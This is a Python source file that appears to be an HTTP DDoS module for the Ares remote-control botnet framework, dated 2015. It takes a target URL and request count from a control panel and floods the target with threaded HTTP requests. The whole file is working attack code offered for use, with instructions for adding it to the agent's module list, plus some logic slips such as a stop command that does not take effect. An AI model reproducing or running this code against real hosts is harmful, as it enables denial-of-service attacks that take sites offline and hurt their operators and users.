# Ares HTTP-DDoS Module
# Pythogen
# Build 1.2

# 12/27/2015 - 4:34 PM - Bug fix: DDoS completion notice now correctly synchronized.

# 12/27/2015 - 4:42 PM - Update: Functional stop now feature included.

# Panel command:

# ddos http://[host]/ [requests]

# ddos http://something.com/ 10000

# Make sure to include 'ddos' to MODULES array in agent.py


# - Import Modules -

import requests
import time
import threading
import pythoncom
import pyHook
import utils
import random
import socket
import sys
import os
import string

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv



# - Stress functions -

def complete():
    # Globalize increment variable
    global inc

    # Announce completion
    utils.send_output("DDoS Complete.")
    inc = 0


def auto_send_request(server, number_of_requests=10):
    # Globalize increment variable
    global inc

    for z in range(number_of_requests):
        try:
            # Is it active?
            if isDos == True:
                urlopen(server)
                # Successful connection
                stdout.write(".") # indicated by period
                # Increment
                inc = inc + 1 # Count total requests sent
                # When all requests have been sent..
                if inc == (requests):
                    # Process complete
                    complete()
            # if not active then break
            elif isDos == False:
                break
                
        except IOError:
            # Failed connection
            stdout.write("E") # indicated by E ('Error')



def flood(url, number_of_requests = 1000, number_of_threads = 50):
    number_of_requests_per_thread = int(number_of_requests/number_of_threads)
    try:
        for x in range(number_of_threads):
            Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()

    except:
        stdout.write("\n[E]\n")
    print("\nDone %i requests on %s" % (number_of_requests, url))



# - Command control -

def run(action, num_req):
    # Globalize increment and request variables
    global requests
    global inc
    global isDos
    # inc initially set to 0
    inc = 0
    # isDos boolean
    isDos = False

    # If command passed is not 'stop' then it's a host
    if action != "stop":
        utils.send_output("DDoS Started.")
        
        # Determines if stresser is active
        isDos = True
        # Argument passed from Ares panel
        server = action # Host put in server
        # Number of requests
        requests = int(num_req) # Specified number of requests

        # Call function to begin attack
        flood(server, requests)


    # Halt process [unimplemented]
    elif action == "stop":
        # Turn it off
        isDos = False
        utils.send_output('DDoS Stopped.')
    else:

        # Display current commands
        utils.send_output("Usage: DDoS [host] [requests]|stop")



def help():
    # Some command details
    help_text = """
    Usage: ddos [host] [requests]|stop
    Starts HTTP DDoS.

    """
    return help_text


    
